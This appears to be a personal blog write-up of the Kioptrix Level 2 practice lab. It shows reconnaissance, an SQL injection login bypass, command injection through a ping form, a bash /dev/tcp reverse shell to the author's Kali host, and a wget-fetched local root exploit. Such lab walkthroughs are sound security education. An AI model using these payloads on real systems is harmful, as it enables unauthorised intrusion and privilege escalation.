---
layout: post
title: "Write-up for Kioptrix 2"
categories: jekyll
permalink : write-ups/kioptrix_2
---

#### Kioptrix Level 2

Hey there, welcome back.. for today, we will play with [Kioptrix 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

First, I ran ifconfig and netdiscover to find my Kali ip and the target ip.
>ifconfig
>netdiscover -i eth0 -r 192.168.1.0/24

![ifconfig](/musubi/assets/kioptrix_2/ifconfig_netdiscover.png)

and after that, I scanned the target using the following nmap options;
>nmap -sS -sV -A -v 192.168.1.101

![first_result](/musubi/assets/kioptrix_2/nmap_result.png)

as we can see above, the target is using **OpenSSH 3.9p1** and **Apache httpd 2.0.52**. After a quick find on `searchsploit`, the only thing I could find is Denial of service (DoS) attack on the machine..

![only_dos](/musubi/assets/kioptrix_2/only_dos.png)

And yeah, we don't want to DoS it, it's not our job for now.. ಠ_ಠ

So, I'll go with web-based attack.

I used nikto and dirb on the target to list directories and find vulnerable configurations.

![nikto_dirb](/musubi/assets/kioptrix_2/nikto_dirb.png)

Okay, nothing interesting here..

Let's open the browser and connect to the target webpage since the port `80` is open (based on the nmap result)

![webpage](/musubi/assets/kioptrix_2/homepage.png)

Wow, what a beautiful homepage.. ✖‿✖

The first thing that came to my mind was.. SQLi attack,so I inserted
> ' or ''='

in the username and password field, and it worked! Yayy..

![pingit](/musubi/assets/kioptrix_2/ping.png)

Based on the image, the form will ping any ip that we put inside the text field, so I tried to ping my Kali machine located at `192.168.1.5`.

![pingKali](/musubi/assets/kioptrix_2/ping_Kali.png)

The output showed that the form executed a simple `ping` command, something like this;
> ping 192.168.1.5 -c 3

I guess the form will send what's inside the text field and pass it into ping command of the machine OS.

Then, it is possible that the field is vulnerable to multiple code execution using the `;` symbol. The symbol is usually used to separate and execute different commands, for example;
> cat meow.txt; echo "y4t0-chan kawaii"

will show the output of the file named **meow.txt** and then print out the word **y4t0-chan kawaii**

To test whether it is possible, I put `192.168.1.5;ls` in the text field.

![OS_command](/musubi/assets/kioptrix_2/OS_command_exec.png)

and it worked.

Now, let's use this to gain shell from our Kali machine.

I tried to use `netcat` but nothing happened, so I used a workaround that uses `bash` to create a reverse shell back to the Kali machine.

First, we need to set up a listener on our Kali machine by using following command;
> nc -lvp 1234

![listener](/musubi/assets/kioptrix_2/nc_listener.png)

and then , on the text field of the form, add;
> 192.168.1.5;bash -i >& /dev/tcp/192.168.1.5/1234 0>&1

![submit](/musubi/assets/kioptrix_2/submit_r_shell.png)

The second command was basically used to open a reverse shell and connect to the listening port of our Kali machine.

Once connected, I tried to find more information about the target.

![connected](/musubi/assets/kioptrix_2/connected_shell.png)

Since the user is **apache** and not in the **superuser** group, I need to use privilege escalation attack to gain root access.

After using some keywords to search for available exploits in `searchsploit`, I stumbled upon a local priv. esc. attack for **CentOS 4.5**.

![9542](/musubi/assets/kioptrix_2/9542.png)

So, I copied the exploit into my `/var/www/html` directory and I fetched it from the target machine using `wget` method.

### in **Kali**
> cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c

I needed to ensure my apache service is running so, I ran;
> service apache2 restart

### in **CentOS 4.5**
since I cant download it directly into the current directory, I moved myself into the /tmp folder.
> cd /tmp  
> wget http://192.168.1.5/9542.c  

and then, I compiled and ran the exploit...

(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧

> gcc 9542.c -o priv  
> chmod +x priv  
> ./priv  

![priv.png](/musubi/assets/kioptrix_2/priv.png)

... and we finally got our root access. That's all for today. Thank you..
